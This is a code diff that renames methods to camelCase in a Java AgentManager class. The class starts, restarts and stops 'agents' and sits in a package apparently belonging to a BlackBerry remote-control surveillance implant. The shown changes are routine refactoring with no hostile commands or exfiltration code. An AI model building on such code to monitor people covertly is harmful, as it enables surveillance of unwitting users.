@@ -56,7 +56,7 @@ public final class AgentManager extends Manager implements Singleton {
      * @see com.ht.rcs.blackberry.Manager#ReStart(int)
      */
     public synchronized boolean reStart(int agentId) {
-        if (statusObj.AgentQueryStatus(agentId) != Common.AGENT_RUNNING) {
+        if (statusObj.agentQueryStatus(agentId) != Common.AGENT_RUNNING) {
             debug.trace("RestartAgent() Agent not running");
             return false;
         }
@@ -87,13 +87,13 @@ public final class AgentManager extends Manager implements Singleton {
             return false;
         }
 
-        if (statusObj.AgentQueryStatus(agentId) == Common.AGENT_RUNNING) {
+        if (statusObj.agentQueryStatus(agentId) == Common.AGENT_RUNNING) {
             debug.info("AgentManager Start RUNNING" + agentId);
             return true;
         }
 
         // return statusObj.StartAgent(agentId);
-        Agent agent = statusObj.GetAgent(agentId);
+        Agent agent = statusObj.getAgent(agentId);
 
         if (agent == null) {
             debug.error("Agent unknown: " + agentId);
@@ -113,12 +113,12 @@ public final class AgentManager extends Manager implements Singleton {
      * @see com.ht.rcs.blackberry.Manager#StartAll()
      */
     public synchronized boolean startAll() {
-        Vector agents = statusObj.GetAgentsList();
+        Vector agents = statusObj.getAgentsList();
 
         for (int i = 0; i < agents.size(); i++) {
             Agent agent = (Agent) agents.elementAt(i);
 
-            if (agent.AgentStatus == Common.AGENT_ENABLED) {
+            if (agent.agentStatus == Common.AGENT_ENABLED) {
                 agent.start();
             }
         }
@@ -133,16 +133,16 @@ public final class AgentManager extends Manager implements Singleton {
      * @see com.ht.rcs.blackberry.Manager#Stop(int)
      */
     public synchronized int stop(int typeId) {
-        if (!statusObj.StopAgent(typeId)) {
+        if (!statusObj.stopAgent(typeId)) {
             debug.trace("StopAgent() Agent already stopped");
             return Common.AGENT_STOPPED;
         }
 
-        while (statusObj.AgentQueryStatus(typeId) != Common.AGENT_STOPPED) {
-            Utils.Sleep(SLEEP_CHECKING_STOP);
+        while (statusObj.agentQueryStatus(typeId) != Common.AGENT_STOPPED) {
+            Utils.sleep(SLEEP_CHECKING_STOP);
         }
 
-        boolean ret = statusObj.ReEnableAgent(typeId);
+        boolean ret = statusObj.reEnableAgent(typeId);
         return ret ? 1 : 0;
     }
 
@@ -153,15 +153,15 @@ public final class AgentManager extends Manager implements Singleton {
      */
     public synchronized int stopAll() {
         // Diciamo a tutti gli agenti di fermarsi
-        statusObj.StopAgents();
-        Vector agents = statusObj.GetAgentsList();
+        statusObj.stopAgents();
+        Vector agents = statusObj.getAgentsList();
 
         for (int i = 0; i < agents.size(); i++) {
             Agent agent = (Agent) agents.elementAt(i);
-            stop(agent.AgentId);
+            stop(agent.agentId);
         }
 
-        statusObj.ReEnableAgents();
+        statusObj.reEnableAgents();
 
         return Common.AGENT_STOPPED;
 
